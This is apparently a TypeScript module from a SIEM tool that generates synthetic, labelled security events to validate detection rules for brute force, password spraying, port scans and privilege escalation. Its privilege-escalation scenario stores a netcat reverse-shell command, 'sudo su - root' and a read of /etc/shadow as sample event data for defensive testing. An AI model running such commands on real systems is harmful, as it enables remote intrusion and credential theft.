/**
 * SentinelX SIEM — Attack Simulation Scenario Generator
 *
 * Generates strictly synthetic, deterministic security events designed to
 * validate the 5 built-in detection rules:
 * - AUTH-001: Brute Force Authentication (10 failures / 60s)
 * - AUTH-002: Password Spraying (5 distinct accounts / 300s)
 * - AUTH-003: Failed Logins Followed by Success (5 failures / 300s)
 * - NET-001: Potential Port Scan (15 distinct ports / 60s)
 * - PRIV-001: Suspicious Privilege Escalation (sensitive action / 300s)
 *
 * Conforms 100% with backend normalization schemas and does not manufacture alerts.
 */

export type ScenarioId = 'AUTH-001' | 'AUTH-002' | 'AUTH-003' | 'NET-001' | 'PRIV-001'

export interface ScenarioDefinition {
  id: ScenarioId
  ruleId: string
  name: string
  severity: 'critical' | 'high' | 'medium' | 'low'
  shortDescription: string
  detailedExplanation: string
  expectedPattern: string
  windowSeconds: number
  thresholdRequirement: string
  eventCount: number
}

export interface SyntheticEvent {
  event_uid: string
  timestamp: string
  event_type: string
  source_ip?: string
  destination_ip?: string
  destination_port?: number
  username?: string
  host?: string
  source: string
  severity: string
  is_synthetic: boolean
  raw_event: Record<string, unknown>
}

export const SCENARIO_DEFINITIONS: Record<ScenarioId, ScenarioDefinition> = {
  'AUTH-001': {
    id: 'AUTH-001',
    ruleId: 'AUTH-001',
    name: 'Brute Force',
    severity: 'high',
    shortDescription: 'High-frequency credential brute-force attack from a single origin IP against a target service.',
    detailedExplanation:
      'Generates 10 sequential authentication failure events from a single source IP spaced 2 seconds apart. Validates that the correlation engine flags brute-force attempts meeting the 10 failure / 60-second threshold.',
    expectedPattern: '10x authentication_failure from 1 source IP within 20s (Threshold: 10 / 60s)',
    windowSeconds: 60,
    thresholdRequirement: '>= 10 failures from same source_ip within 60s',
    eventCount: 10,
  },
  'AUTH-002': {
    id: 'AUTH-002',
    ruleId: 'AUTH-002',
    name: 'Password Spraying',
    severity: 'high',
    shortDescription: 'Horizontal credential spraying targeting multiple accounts to avoid account lockout.',
    detailedExplanation:
      'Generates 6 failed authentication events from a single source IP, each targeting a distinct enterprise username within 30 seconds. Meets the rule threshold of >= 5 distinct accounts within 300 seconds.',
    expectedPattern: '6x authentication_failure across 6 distinct accounts from 1 source IP (Threshold: 5 / 300s)',
    windowSeconds: 300,
    thresholdRequirement: '>= 5 distinct usernames from same source_ip within 300s',
    eventCount: 6,
  },
  'AUTH-003': {
    id: 'AUTH-003',
    ruleId: 'AUTH-003',
    name: 'Authentication Failures Followed by Success',
    severity: 'critical',
    shortDescription: 'Repeated authentication failures culminating in a successful login for the same account.',
    detailedExplanation:
      'Generates 5 authentication failures followed by 1 successful login for the exact same source IP and account within 20 seconds. Demonstrates detection of successful compromise following brute force.',
    expectedPattern: '5x authentication_failure followed by 1x authentication_success for same user and IP (Threshold: 5 / 300s)',
    windowSeconds: 300,
    thresholdRequirement: '>= 5 failures before 1 success for same (source_ip, username) within 300s',
    eventCount: 6,
  },
  'NET-001': {
    id: 'NET-001',
    ruleId: 'NET-001',
    name: 'Potential Port Scan',
    severity: 'medium',
    shortDescription: 'Rapid network reconnaissance probing multiple distinct destination ports.',
    detailedExplanation:
      'Generates 16 network connection events from a single source IP targeting 16 distinct standard service ports across 30 seconds. Exceeds the 15 distinct ports / 60-second threshold.',
    expectedPattern: '16x network_connection to 16 distinct destination ports from 1 source IP (Threshold: 15 / 60s)',
    windowSeconds: 60,
    thresholdRequirement: '>= 15 distinct destination_ports from same source_ip within 60s',
    eventCount: 16,
  },
  'PRIV-001': {
    id: 'PRIV-001',
    ruleId: 'PRIV-001',
    name: 'Privilege Escalation',
    severity: 'high',
    shortDescription: 'A privilege escalation event immediately followed by sensitive system activity.',
    detailedExplanation:
      'Generates an initial privilege_escalation event (e.g. sudo role elevation) followed by process_creation and file_access events by the elevated account within 15 seconds. Validates PRIV-001 correlation.',
    expectedPattern: '1x privilege_escalation followed by process_creation and file_access by same account within 15s',
    windowSeconds: 300,
    thresholdRequirement: '1 privilege_escalation followed by >= 1 sensitive action (process/file) within 300s',
    eventCount: 3,
  },
}

/**
 * Generate a run-isolated IPv4 address in the RFC 5737 TEST-NET-2 documentation range (198.51.100.0/24).
 * This ensures simulation runs never conflict with real internal networks or previous simulation runs.
 */
function getIsolatedIp(runId: string, offset: number = 0): string {
  let hash = 0
  for (let i = 0; i < runId.length; i++) {
    hash = (hash * 31 + runId.charCodeAt(i)) & 0xffff
  }
  const lastOctet = 20 + ((hash + offset) % 200)
  return `198.51.100.${lastOctet}`
}

/**
 * Generate synthetic events for the selected scenario.
 *
 * @param scenarioId The scenario identifier (e.g. 'AUTH-001')
 * @param runId Unique execution run identifier to ensure entity isolation
 * @param baseTime Optional start timestamp (defaults to slightly in the past so events are current)
 */
export function generateScenarioEvents(
  scenarioId: ScenarioId,
  runId: string,
  baseTime: Date = new Date()
): SyntheticEvent[] {
  const events: SyntheticEvent[] = []
  const originIp = getIsolatedIp(runId)
  const startTime = new Date(baseTime.getTime() - 40 * 1000) // 40 seconds ago

  switch (scenarioId) {
    case 'AUTH-001': {
      // 10 authentication failures from same source_ip within 20s
      for (let i = 0; i < 10; i++) {
        const eventTime = new Date(startTime.getTime() + i * 2000)
        const eventUid = `sim-bf-${runId}-${i + 1}`
        const rawPayload = {
          event_uid: eventUid,
          timestamp: eventTime.toISOString(),
          event_type: 'authentication_failure',
          source_ip: originIp,
          destination_ip: '10.0.0.10',
          destination_port: 22,
          username: 'admin',
          host: 'bastion-host-01',
          source: 'simulation-lab',
          severity: 'high',
          is_synthetic: true,
          simulation_meta: {
            scenario: 'AUTH-001',
            run_id: runId,
            sequence_step: i + 1,
            total_steps: 10,
          },
        }
        events.push({
          event_uid: eventUid,
          timestamp: eventTime.toISOString(),
          event_type: 'authentication_failure',
          source_ip: originIp,
          destination_ip: '10.0.0.10',
          destination_port: 22,
          username: 'admin',
          host: 'bastion-host-01',
          source: 'simulation-lab',
          severity: 'high',
          is_synthetic: true,
          raw_event: rawPayload,
        })
      }
      break
    }

    case 'AUTH-002': {
      // 6 authentication failures for distinct accounts from same source_ip
      const usernames = [
        `sec_admin_${runId.slice(-3)}`,
        `analyst_1_${runId.slice(-3)}`,
        `devops_${runId.slice(-3)}`,
        `finance_mgr_${runId.slice(-3)}`,
        `sys_operator_${runId.slice(-3)}`,
        `it_director_${runId.slice(-3)}`,
      ]
      for (let i = 0; i < usernames.length; i++) {
        const eventTime = new Date(startTime.getTime() + i * 4000)
        const eventUid = `sim-spray-${runId}-${i + 1}`
        const rawPayload = {
          event_uid: eventUid,
          timestamp: eventTime.toISOString(),
          event_type: 'authentication_failure',
          source_ip: originIp,
          destination_ip: '10.0.0.25',
          destination_port: 443,
          username: usernames[i],
          host: 'auth-gateway-02',
          source: 'simulation-lab',
          severity: 'high',
          is_synthetic: true,
          simulation_meta: {
            scenario: 'AUTH-002',
            run_id: runId,
            account_target: usernames[i],
            sequence_step: i + 1,
          },
        }
        events.push({
          event_uid: eventUid,
          timestamp: eventTime.toISOString(),
          event_type: 'authentication_failure',
          source_ip: originIp,
          destination_ip: '10.0.0.25',
          destination_port: 443,
          username: usernames[i],
          host: 'auth-gateway-02',
          source: 'simulation-lab',
          severity: 'high',
          is_synthetic: true,
          raw_event: rawPayload,
        })
      }
      break
    }

    case 'AUTH-003': {
      // 5 authentication failures followed by 1 authentication success
      const targetUser = `operator_${runId.slice(-4)}`
      for (let i = 0; i < 5; i++) {
        const eventTime = new Date(startTime.getTime() + i * 3000)
        const eventUid = `sim-f2s-${runId}-fail-${i + 1}`
        const rawPayload = {
          event_uid: eventUid,
          timestamp: eventTime.toISOString(),
          event_type: 'authentication_failure',
          source_ip: originIp,
          destination_ip: '10.0.0.12',
          destination_port: 3389,
          username: targetUser,
          host: 'rdp-srv-01',
          source: 'simulation-lab',
          severity: 'medium',
          is_synthetic: true,
          simulation_meta: {
            scenario: 'AUTH-003',
            phase: 'failure_sequence',
            attempt: i + 1,
          },
        }
        events.push({
          event_uid: eventUid,
          timestamp: eventTime.toISOString(),
          event_type: 'authentication_failure',
          source_ip: originIp,
          destination_ip: '10.0.0.12',
          destination_port: 3389,
          username: targetUser,
          host: 'rdp-srv-01',
          source: 'simulation-lab',
          severity: 'medium',
          is_synthetic: true,
          raw_event: rawPayload,
        })
      }

      // 6th event: Success
      const successTime = new Date(startTime.getTime() + 17000)
      const successUid = `sim-f2s-${runId}-success`
      const rawSuccessPayload = {
        event_uid: successUid,
        timestamp: successTime.toISOString(),
        event_type: 'authentication_success',
        source_ip: originIp,
        destination_ip: '10.0.0.12',
        destination_port: 3389,
        username: targetUser,
        host: 'rdp-srv-01',
        source: 'simulation-lab',
        severity: 'low',
        is_synthetic: true,
        simulation_meta: {
          scenario: 'AUTH-003',
          phase: 'culminating_success',
        },
      }
      events.push({
        event_uid: successUid,
        timestamp: successTime.toISOString(),
        event_type: 'authentication_success',
        source_ip: originIp,
        destination_ip: '10.0.0.12',
        destination_port: 3389,
        username: targetUser,
        host: 'rdp-srv-01',
        source: 'simulation-lab',
        severity: 'low',
        is_synthetic: true,
        raw_event: rawSuccessPayload,
      })
      break
    }

    case 'NET-001': {
      // 16 distinct ports probed from same source_ip within 30s
      const scanPorts = [
        21, 22, 23, 25, 53, 80, 110, 135,
        139, 143, 443, 445, 1433, 3306, 3389, 8080,
      ]
      for (let i = 0; i < scanPorts.length; i++) {
        const eventTime = new Date(startTime.getTime() + i * 1800)
        const eventUid = `sim-portscan-${runId}-${scanPorts[i]}`
        const rawPayload = {
          event_uid: eventUid,
          timestamp: eventTime.toISOString(),
          event_type: 'network_connection',
          source_ip: originIp,
          destination_ip: '10.0.0.80',
          destination_port: scanPorts[i],
          host: 'internal-core-router',
          source: 'simulation-lab',
          severity: 'info',
          is_synthetic: true,
          simulation_meta: {
            scenario: 'NET-001',
            probed_port: scanPorts[i],
            probe_index: i + 1,
          },
        }
        events.push({
          event_uid: eventUid,
          timestamp: eventTime.toISOString(),
          event_type: 'network_connection',
          source_ip: originIp,
          destination_ip: '10.0.0.80',
          destination_port: scanPorts[i],
          host: 'internal-core-router',
          source: 'simulation-lab',
          severity: 'info',
          is_synthetic: true,
          raw_event: rawPayload,
        })
      }
      break
    }

    case 'PRIV-001': {
      // 1 privilege_escalation event followed by process_creation and file_access
      const privUser = `svc_worker_${runId.slice(-4)}`

      // Step 1: Privilege Escalation
      const t1 = new Date(startTime.getTime())
      const uid1 = `sim-privesc-${runId}-elevate`
      events.push({
        event_uid: uid1,
        timestamp: t1.toISOString(),
        event_type: 'privilege_escalation',
        source_ip: originIp,
        username: privUser,
        host: 'prod-api-cluster',
        source: 'simulation-lab',
        severity: 'high',
        is_synthetic: true,
        raw_event: {
          event_uid: uid1,
          timestamp: t1.toISOString(),
          event_type: 'privilege_escalation',
          source_ip: originIp,
          username: privUser,
          host: 'prod-api-cluster',
          source: 'simulation-lab',
          severity: 'high',
          is_synthetic: true,
          action: 'sudo su - root',
        },
      })

      // Step 2: Process Creation (sensitive action)
      const t2 = new Date(startTime.getTime() + 4000)
      const uid2 = `sim-privesc-${runId}-exec`
      events.push({
        event_uid: uid2,
        timestamp: t2.toISOString(),
        event_type: 'process_creation',
        source_ip: originIp,
        username: privUser,
        host: 'prod-api-cluster',
        source: 'simulation-lab',
        severity: 'high',
        is_synthetic: true,
        raw_event: {
          event_uid: uid2,
          timestamp: t2.toISOString(),
          event_type: 'process_creation',
          source_ip: originIp,
          username: privUser,
          host: 'prod-api-cluster',
          source: 'simulation-lab',
          severity: 'high',
          is_synthetic: true,
          process: '/bin/bash -c nc -e /bin/sh 198.51.100.200 4444',
        },
      })

      // Step 3: File Access (sensitive action)
      const t3 = new Date(startTime.getTime() + 8000)
      const uid3 = `sim-privesc-${runId}-file`
      events.push({
        event_uid: uid3,
        timestamp: t3.toISOString(),
        event_type: 'file_access',
        source_ip: originIp,
        username: privUser,
        host: 'prod-api-cluster',
        source: 'simulation-lab',
        severity: 'high',
        is_synthetic: true,
        raw_event: {
          event_uid: uid3,
          timestamp: t3.toISOString(),
          event_type: 'file_access',
          source_ip: originIp,
          username: privUser,
          host: 'prod-api-cluster',
          source: 'simulation-lab',
          severity: 'high',
          is_synthetic: true,
          file: '/etc/shadow',
          operation: 'read',
        },
      })
      break
    }
  }

  return events
}
